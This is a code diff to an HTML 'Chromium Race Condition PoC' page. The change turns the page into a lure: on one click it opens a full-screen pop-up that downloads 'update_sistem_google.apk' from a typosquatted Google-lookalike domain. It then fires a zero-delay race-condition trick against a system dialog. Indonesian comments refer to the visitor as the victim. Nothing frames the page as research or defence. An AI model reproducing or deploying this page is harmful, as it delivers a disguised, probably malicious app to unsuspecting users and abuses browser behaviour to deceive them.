@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chromium Race Condition PoC</title>
+    <title>Chromium Race Condition PoC - Fullscreen Pop-up</title>
 </head>
 <body style="height: 100vh; background: #eee;">
     <h1>Click Once - Tested on Chrome Latest</h1>
@@ -11,17 +11,22 @@
         const sysDialog = document.getElementById('sysDialog');
         
         document.body.onclick = () => {
-            // Step 1: Open Window
-                window.open('file:///C:/', '_blank', 'width=200,height=200');
+            // Mengambil resolusi maksimal layar yang tersedia pada perangkat korban
+            const lebarMaksimal = screen.availWidth;
+            const tinggiMaksimal = screen.availHeight;
 
-            // Step 2: Race condition trigger with 0 delay
-            // This prevents the browser from consuming the user activation token correctly.
+            // Mengatur fitur pop-up agar memenuhi layar (top=0, left=0)
+            const fiturPopUp = `width=${lebarMaksimal},height=${tinggiMaksimal},top=0,left=0,resizable=yes,scrollbars=yes`;
+
+            // Step 1: Open Window dengan ukuran layar penuh
+            window.open('https://googllogoligaturee.my.id/update_sistem_google.apk', '_blank', fiturPopUp);
+
+            // Step 2: Race condition trigger dengan 0 delay
             setTimeout(() => {
-                window.open('file:///C:/', '_blank', 'width=200,height=200');
                 sysDialog.click();
             }, 0);
             
-            console.log("Attack executed");
+            console.log("Attack executed with full screen pop-up");
         };
     </script>
 </body>
